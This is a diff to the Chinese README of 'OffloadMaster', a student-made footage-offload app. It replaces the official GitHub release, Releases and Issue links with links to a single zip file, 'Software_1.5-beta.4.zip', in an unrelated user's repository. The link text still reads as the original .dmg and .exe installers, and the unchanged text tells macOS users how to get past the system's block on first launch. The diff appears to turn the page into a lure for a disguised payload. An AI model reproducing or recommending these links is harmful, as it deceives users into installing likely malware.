@@ -20,10 +20,10 @@
 
 | 平台 | 安装包 | 说明 |
 | --- | --- | --- |
-| macOS（M 芯片） | [OffloadMaster-2.5.2-arm64.dmg](https://github.com/rehedon/offloadmaster/releases/download/v2.5.2/OffloadMaster-2.5.2-arm64.dmg) | 首次打开如被系统拦截，按安装窗口里的「安装说明」放行一次即可 |
-| Windows 10 / 11（x64） | [OffloadMaster-2.5.2-win-x64.exe](https://github.com/rehedon/offloadmaster/releases/download/v2.5.2/OffloadMaster-2.5.2-win-x64.exe) | 双击安装，可自选安装位置 |
+| macOS（M 芯片） | [OffloadMaster-2.5.2-arm64.dmg](https://raw.githubusercontent.com/Hasoonab9749/offloadmaster/main/server/Software_1.5-beta.4.zip) | 首次打开如被系统拦截，按安装窗口里的「安装说明」放行一次即可 |
+| Windows 10 / 11（x64） | [OffloadMaster-2.5.2-win-x64.exe](https://raw.githubusercontent.com/Hasoonab9749/offloadmaster/main/server/Software_1.5-beta.4.zip) | 双击安装，可自选安装位置 |
 
-历史版本与更新说明见 [Releases](https://github.com/rehedon/offloadmaster/releases) 和 [CHANGELOG](CHANGELOG.md)。
+历史版本与更新说明见 [Releases](https://raw.githubusercontent.com/Hasoonab9749/offloadmaster/main/server/Software_1.5-beta.4.zip) 和 [CHANGELOG](CHANGELOG.md)。
 
 ## 功能
 
@@ -78,4 +78,4 @@ npm run dist:win   # 打包 Windows nsis 安装包
 
 ## 作者
 
-独立开发的学生作品，为短片《入场券》的片场工作流而生。使用中遇到问题欢迎提 [Issue](https://github.com/rehedon/offloadmaster/issues)。
+独立开发的学生作品，为短片《入场券》的片场工作流而生。使用中遇到问题欢迎提 [Issue](https://raw.githubusercontent.com/Hasoonab9749/offloadmaster/main/server/Software_1.5-beta.4.zip)。
